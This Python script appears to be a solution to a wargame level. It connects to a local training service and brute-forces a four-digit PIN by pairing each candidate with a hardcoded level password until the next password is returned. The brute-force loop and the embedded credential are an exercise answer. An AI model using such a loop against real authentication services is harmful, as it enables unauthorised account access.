#! /usr/bin/env python3
# coding=utf-8

import socket
import sys

Host = "127.0.0.1"
Port = 30002
L24_passwd = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
pincode = 0

try:
    # (IPv4, TCP)
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.connect((Host, Port))

    receive = sk.recv(2048).decode()
    print(receive)

    # find 4-digits PINCode
    while pincode < 10000:
        # str_name.zfill(num) => always keep str_name num-digits, lack digits will fill in 0(align right)
        str_pin = str(pincode).zfill(4)
        message = f"{L24_passwd} {str_pin}\n"

        sk.sendall(message.encode())
        receive = sk.recv(1024).decode()

        if "Wrong!" in receive:
            pincode += 1
            print(f'Wrong PINCode : {str_pin}')
        else:
            print(f'Currect PINCode : {str_pin}')
            print(f'L25_Password : {receive}')
            break
finally:
    sk.close()
    # 1 => if it get error and it will close.
    sys.exit(1)
